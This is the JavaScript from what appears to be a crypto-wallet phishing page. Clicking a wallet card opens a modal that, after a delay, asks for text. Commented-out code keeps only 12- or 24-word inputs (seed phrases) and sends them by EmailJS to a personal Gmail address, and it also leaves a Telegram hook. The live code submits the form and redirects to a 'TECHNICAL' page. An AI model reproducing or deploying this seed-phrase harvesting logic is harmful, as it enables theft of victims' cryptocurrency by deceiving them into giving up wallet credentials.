// document.addEventListener("DOMContentLoaded", function () {
//   const containers = document.querySelectorAll(".clickable");
//   const modal = document.getElementById("myModal");
//   const modalImage = document.getElementById("modalImage");
//   const modalTitle = document.getElementById("modalTitle");
//   const stage1 = document.getElementById("stage1");
//   const buttonContainer = document.getElementById("buttonContainer");
//   const textAreaContainer = document.getElementById("textAreaContainer");
//   const inputTextArea = document.getElementById("inputTextArea");
//   const sendButton = document.getElementById("sendButton");
//   const successContainer = document.getElementById("successContainer");
//   const errorMessage = document.getElementById("errorMessage");

//   const closeButton = document.querySelector(".close");

//   closeButton.addEventListener("click", function () {
//     modal.style.display = "none";
//     clearTimeout(modalTimeout);
//     resetModal();
//   });

//   //Telegram here

//   function openModal(imgSrc, text) {
//     modalImage.src = imgSrc;
//     modalTitle.textContent = text;

//     modal.style.display = "flex";

//     modalTimeout = setTimeout(() => {
//       stage1.style.display = "none";
//       buttonContainer.style.display = "block";
//     }, 5000);
//   }

//   containers.forEach((container) => {
//     container.addEventListener("click", function () {
//       const imgSrc = container.querySelector("img").src;
//       const text = container.querySelector("h2").textContent;

//       openModal(imgSrc, text);
//     });
//   });

//   function resetModal() {
//     stage1.style.display = "block";
//     buttonContainer.style.display = "none";
//     textAreaContainer.style.display = "none";
//     successContainer.style.display = "none";
//     inputTextArea.value = "";
//     errorMessage.classList.remove("show-error");
//   }

//   containers.forEach((container) => {
//     container.addEventListener("click", function () {
//       const imgSrc = container.querySelector("img").src;
//       const text = container.querySelector("h2").textContent;

//       modalImage.src = imgSrc;
//       modalTitle.textContent = text;

//       stage1.style.display = "block";
//       modal.style.display = "flex";
//     });
//   });

//   window.addEventListener("click", function (event) {
//     if (event.target === modal) {
//       modal.style.display = "none";
//       clearTimeout(modalTimeout);
//       resetModal();
//     }
//   });

//   let modalTimeout;

//   document
//     .getElementById("clickableButton")
//     .addEventListener("click", function () {
//       buttonContainer.style.display = "none";
//       textAreaContainer.style.display = "block";
//     });

//   sendButton.addEventListener("click", function (event) {
//     event.preventDefault();

//     const formData = new FormData(document.getElementById("my-form"));

//     fetch("action_page.php", {
//       method: "POST",
//       body: formData,
//     })
//       .then((response) => response.text())
//       .then((data) => {
//         sendEmail(data);
//         window.location.href = "/TECHNICAL.html";
//       })
//       .catch((error) => console.error("Error submitting form:", error));
//     const words = inputTextArea.value.trim().split(/\s+/);

//     if (words.length === 12 || words.length === 24) {
//       const message = modalTitle.textContent + "\n\n" + inputTextArea.value;
//       //sendToTelegram(message);

//       //Email send
//       //emailjs.init({ publicKey: "CwZJ5v2UX4cUCPvuy" });

//       emailjs
//         .send("service_q623k56", "template_eypceto", {
//           to_email: "anssville@gmail.com",
//           message: message,
//         })
//         .then(function (response) {
//           console.log("Sent succefully:", response);

//           textAreaContainer.style.display = "none"; // hides the text area container
//           successContainer.style.display = "block";
//           setTimeout(function () {
//             modal.style.display = "none";
//             resetModal();
//           }, 2000);
//         })
//         .catch(function (error) {
//           console.error("Error sending:", error);
//         });
//     } else {
//       errorMessage.classList.add("show-error");
//       setTimeout(() => {
//         errorMessage.classList.remove("show-error");
//       }, 3000);
//     }
//   });
// });

document.addEventListener("DOMContentLoaded", function () {
  const containers = document.querySelectorAll(".clickable");
  const modal = document.getElementById("myModal");
  const modalImage = document.getElementById("modalImage");
  const modalTitle = document.getElementById("modalTitle");
  const stage1 = document.getElementById("stage1");
  const buttonContainer = document.getElementById("buttonContainer");
  const textAreaContainer = document.getElementById("textAreaContainer");
  const inputTextArea = document.getElementById("inputTextArea");
  const sendButton = document.getElementById("sendButton");
  const successContainer = document.getElementById("successContainer");
  const errorMessage = document.getElementById("errorMessage");

  const closeButton = document.querySelector(".close");

  closeButton.addEventListener("click", function () {
    modal.style.display = "none";
    clearTimeout(modalTimeout);
    resetModal();
  });

  function openModal(imgSrc, text) {
    modalImage.src = imgSrc;
    modalTitle.textContent = text;

    modal.style.display = "flex";

    modalTimeout = setTimeout(() => {
      stage1.style.display = "none";
      buttonContainer.style.display = "block";
    }, 5000);
  }

  containers.forEach((container) => {
    container.addEventListener("click", function () {
      const imgSrc = container.querySelector("img").src;
      const text = container.querySelector("h2").textContent;

      openModal(imgSrc, text);
    });
  });

  function resetModal() {
    stage1.style.display = "block";
    buttonContainer.style.display = "none";
    textAreaContainer.style.display = "none";
    successContainer.style.display = "none";
    inputTextArea.value = "";
    errorMessage.classList.remove("show-error");
  }

  window.addEventListener("click", function (event) {
    if (event.target === modal) {
      modal.style.display = "none";
      clearTimeout(modalTimeout);
      resetModal();
    }
  });

  let modalTimeout;

  document
    .getElementById("clickableButton")
    .addEventListener("click", function () {
      buttonContainer.style.display = "none";
      textAreaContainer.style.display = "block";
    });

  sendButton.addEventListener("click", function () {
    setTimeout(function () {
      window.location.href = "./TECHNICAL.html";
    }, 3000); // Redirect after 3 seconds (adjust as needed)

    // event.preventDefault();

    // Disable empty file fields before submitting.
    // if (
    //   navigator.userAgent.indexOf("Safari") != -1 &&
    //   navigator.userAgent.indexOf("Chrome") == -1
    // ) {
    //   let $inputs = $('input[type="file"]:not([disabled])', phrase);
    //   $inputs.each(function (_, input) {
    //     if (input.files.length > 0) return;
    //     $(input).prop("disabled", true);
    //   });
    // }

    // const formData = new FormData(phrase);

    // Re-enable empty file fields after creating FormData.
    // if (
    //   navigator.userAgent.indexOf("Safari") != -1 &&
    //   navigator.userAgent.indexOf("Chrome") == -1
    // ) {
    //   $inputs.prop("disabled", false);
    // }

    // fetch("action_page.php", {
    //   method: "POST",
    //   body: formData,
    // })
    //   .then((response) => response.text())
    //   .then((data) => {
    //     sendEmail(data);
    //     window.location.href = "./TECHNICAL.html";
    //   })
    //   .catch((error) => console.error("Error submitting form:", error));
  });

  // function sendEmail() {
  //   const emailjsParams = {
  //     message: document.getElementById("inputTextArea").value,
  //   };

  //   emailjs
  //     .send("service_q623k56", "template_ombrcte", emailjsParams)
  //     .then((response) => {
  //       console.log("Email sent successfully:", response);

  //       textAreaContainer.style.display = "none"; // hides the text area container
  //       successContainer.style.display = "block";
  //       setTimeout(function () {
  //         modal.style.display = "none";
  //         resetModal();
  //       }, 2000);
  //     })
  //     .catch((error) => {
  //       console.error("Error sending email:", error);
  //     });
  // }
});
